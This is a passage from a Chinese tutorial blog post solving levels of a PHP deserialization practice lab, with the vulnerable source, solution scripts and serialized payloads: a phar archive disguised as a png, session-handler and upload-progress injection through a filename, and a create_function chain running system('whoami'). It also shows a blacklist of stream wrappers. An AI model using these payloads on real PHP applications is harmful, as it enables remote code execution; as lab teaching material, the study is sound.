class="hljs-keyword">new</span> TestObject();<br><span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p>由于upload文件，所以需要更改文件后缀，这里更改为png</p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/14.png" style="zoom:60%;"><p>再访问<code>index.php</code>，通过phar协议访问<code>upload/2.png</code></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/15.png"></p><h4 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$boo1</span>=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$black_list</span>=[<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;glob&#x27;</span>,<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;http&#x27;</span>,<span class="hljs-string">&#x27;ftp&#x27;</span>,<span class="hljs-string">&#x27;zip&#x27;</span>,<span class="hljs-string">&#x27;https&#x27;</span>,<span class="hljs-string">&#x27;ftps&#x27;</span>,<span class="hljs-string">&#x27;phar&#x27;</span>];<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$black_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>)&#123;<span class="hljs-comment">// 限制了协议</span><br><span class="hljs-variable">$front</span>=substr(<span class="hljs-variable">$filename</span>,<span class="hljs-number">0</span>,strlen(<span class="hljs-variable">$item</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$front</span>==<span class="hljs-variable">$item</span>)&#123;<br><span class="hljs-variable">$boo1</span>=<span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filename</span>) <span class="hljs-keyword">and</span> <span class="hljs-variable">$boo1</span>)&#123;<br><span class="hljs-keyword">echo</span> md5_file(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>upload跟刚才的没有变化</p><p>这关只是限制了协议，其他的更上一关相同</p><p>php协议参考：<a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/16.png"></p><h4 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h4><p>环境配置：</p><ul><li><code>PHP5.6.9</code></li><li><code>session.auto_start=0;</code></li><li><code>session.serialize_handler = php;</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># index.php</span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*hint.php*/</span><br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-keyword">$this</span>-&gt;her=md5(rand(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;name===<span class="hljs-keyword">$this</span>-&gt;her)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># hint.php</span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这关主要是考察<code>php</code>中，<code>session</code>相关的反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># wp.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-keyword">$this</span>-&gt;her=md5(rand(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;name===<span class="hljs-keyword">$this</span>-&gt;her)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Flag();<br><span class="hljs-variable">$b</span> =  serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-comment"># unserialize($b); 测试能否成功</span><br><span class="hljs-comment">// 输出：O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;N;&#125;</span><br></code></pre></td></tr></table></figure><p>访问<code>hint.php</code>，传入参数<code>a</code>，切记在序列化字符串前加 <code>|</code></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/17.png"></p><p>再访问<code>index.php</code></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/18.png"></p><h4 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># index.php</span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;name==<span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            phpinfo();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这题是<code>session.upload_progress</code>的反序列化</p><p>解题思路</p><p>先构造一个上传表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;test&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>抓取上传文件的包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># wp.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;name == <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            phpinfo();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> test();<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//输出: O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;flag&quot;;&#125;</span><br><span class="hljs-comment">//更改为：O:4:\&quot;test\&quot;:1:&#123;s:4:\&quot;name\&quot;;s:4:\&quot;flag\&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>在包中将<code>filename</code>更改为<code>|O:4:\&quot;test\&quot;:1:&#123;s:4:\&quot;name\&quot;;s:4:\&quot;flag\&quot;;&#125;</code></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/19.png"></p><h3 id="0x02-相关基础"><a href="#0x02-相关基础" class="headerlink" title="0x02 相关基础"></a>0x02 相关基础</h3><h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h4><p>PHP中的内置函数，用于在PHP中创建匿名(lambda-style)函数。</p><p>使用范围：<code>PHP 4&gt; = 4.0.1，PHP 5，PHP 7</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 语法</span><br>create_function(<span class="hljs-keyword">string</span> <span class="hljs-variable">$args</span>,<span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span>)<br><span class="hljs-keyword">string</span> <span class="hljs-variable">$args</span> 声明的函数变量部分<br><span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span> 执行的方法代码部分<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 举个栗子</span><br><span class="hljs-variable">$func</span> = create_function(<span class="hljs-string">&#x27;$a,$b&#x27;</span>,<span class="hljs-string">&#x27;return $a + $b;&#x27;</span>);<br>var_dump(<span class="hljs-variable">$func</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$func</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br><br><span class="hljs-comment"># 相当于</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span> + <span class="hljs-variable">$b</span>;&#125;<br></code></pre></td></tr></table></figure><h4 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h4><p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p><h5 id="1-基础可变函数"><a href="#1-基础可变函数" class="headerlink" title="1 基础可变函数"></a>1 基础可变函数</h5><p>变量值为某一函数名，则在变量后加上圆括号就可以调用相应函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 案例来源 php中文网https://www.php.net/manual/zh/functions.variable-functions.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;In foo()&lt;br /&gt;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;In bar(); argument was &#x27;<span class="hljs-subst">$arg</span>&#x27;.&lt;br /&gt;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// 使用 echo 的包装函数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echoit</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$string</span>;<br>&#125;<br><br><span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;foo&#x27;</span>;<br><span class="hljs-variable">$func</span>();        <span class="hljs-comment">// 调用 foo()</span><br><br><span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;bar&#x27;</span>;<br><span class="hljs-variable">$func</span>(<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// 调用 bar()</span><br><br><span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;echoit&#x27;</span>;<br><span class="hljs-variable">$func</span>(<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// 调用 echoit()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="2-可变函数调用对象的方法"><a href="#2-可变函数调用对象的方法" class="headerlink" title="2 可变函数调用对象的方法"></a>2 可变函数调用对象的方法</h5><p>跟上面一样只不过加上类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 案例来源 PHP中文网</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Variable</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;Bar&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$name</span>(); <span class="hljs-comment">// 调用 Bar() 方法</span><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Bar</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is Bar&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$foo</span> = <span class="hljs-keyword">new</span> Foo();<br><span class="hljs-variable">$funcname</span> = <span class="hljs-string">&quot;Variable&quot;</span>;<br><span class="hljs-variable">$foo</span>-&gt;<span class="hljs-variable">$funcname</span>();  <span class="hljs-comment">// 调用 $foo-&gt;Variable()</span><br><br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment"># 需要注意的是，当调用静态方法时，函数调用要比静态属性优先</span><br></code></pre></td></tr></table></figure><h5 id="3-复杂调用"><a href="#3-复杂调用" class="headerlink" title="3 复杂调用"></a>3 复杂调用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bar\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">baz</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;baz\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 当数组0位元素为类名，1位元素为方法名时，在调用可变函数时会找到该类该方法</span><br><span class="hljs-variable">$func</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>);<br><span class="hljs-variable">$func</span>(); <span class="hljs-comment">// 打印 &quot;bar&quot;</span><br><br><span class="hljs-comment">// 当数组0位元素为类名，1位元素为方法名时，在调用可变函数时会找到该类该方法</span><br><span class="hljs-variable">$func</span> = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> Foo, <span class="hljs-string">&quot;baz&quot;</span>);<br><span class="hljs-variable">$func</span>(); <span class="hljs-comment">// 打印 &quot;baz&quot;</span><br><br><span class="hljs-comment">// PHP5.6.9时无法使用，PHP7.0.x可以使用</span><br><span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;Foo::bar&quot;</span>;<br><span class="hljs-variable">$func</span>(); <span class="hljs-comment">// 打印 &quot;bar&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ok，这两个看完可以继续题目了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;                    <span class="hljs-comment">// key应该是一个数组</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)//析构函数，对象在销毁时调用</span><br><span class="hljs-function">    </span>&#123;<br>        unserialize(<span class="hljs-keyword">$this</span>-&gt;key)();<span class="hljs-comment">// 结尾有个括号，可变函数</span><br>    &#125; <span class="hljs-comment">// 调用GetFlag类中的get_flag()</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;;&#125;system(&quot;whoami&quot;);//&#x27;</span>;<span class="hljs-comment">// 闭合前面，注释后面</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$action</span> = <span class="hljs-string">&#x27;create_function&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//最终目的</span><br>        <span class="hljs-variable">$a</span>=<span class="hljs-keyword">$this</span>-&gt;action;<br>        <span class="hljs-variable">$a</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> func;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> GetFlag;<br><span class="hljs-variable">$a</span>-&gt;key = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$b</span>,<span class="hljs-string">&quot;get_flag&quot;</span>));<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// 输出：O:4:&quot;func&quot;:1:&#123;s:3:&quot;key&quot;;s:123:&quot;a:2:&#123;i:0;O:7:&quot;GetFlag&quot;:2:&#123;s:4:&quot;code&quot;;s:21:&quot;;&#125;system(&quot;whoami&quot;);//&quot;;s:6:&quot;action&quot;;s:15:&quot;create_function&quot;;&#125;i:1;s:8:&quot;get_flag&quot;;&#125;&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h4 id="PHP的魔法函数"><a href="#PHP的魔法函数" class="headerlink" title="PHP的魔法函数"></a>PHP的魔法函数</h4><table><thead><tr><th><strong>魔术方法</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>__wakeup()</td><td>执行unserialize()时，先会调用这个函数(如果有)</td></tr><tr><td>__sleep()</td><td>执行serialize()时，先会调用这个函数</td></tr><tr><td>__destruct()</td><td>对象被销毁时触发</td></tr><tr><td>__call()</td><td>在对象上下文中调用不可访问的方法时触发</td></tr><tr><td>__callStatic()</td><td>在静态上下文中调用不可访问的方法时触发</td></tr><tr><td>__get()</td><td>用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</td></tr><tr><td>__set()</td><td>用于将数据写入不可访问的属性</td></tr><tr><td>__isset()</td><td>在不可访问的属性上调用isset()或empty()触发</td></tr><tr><td>__unset()</td><td>在不可访问的属性上使用unset()时触发</td></tr><tr><td>__toString()</td><td>把类当作字符串使用时触发</td></tr><tr><td>__invoke()</td><td>当尝试将对象调用为函数时触发</td></tr><tr><td>__construct</td><td>对象进行实例化时执行的</td></tr></tbody></table><h4 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h4><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p><p>采用HTTP作为底层通讯协议，XML作为数据传送的格式</p><p>(PHP 5, PHP 7, PHP 8)</p><p>类摘要</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 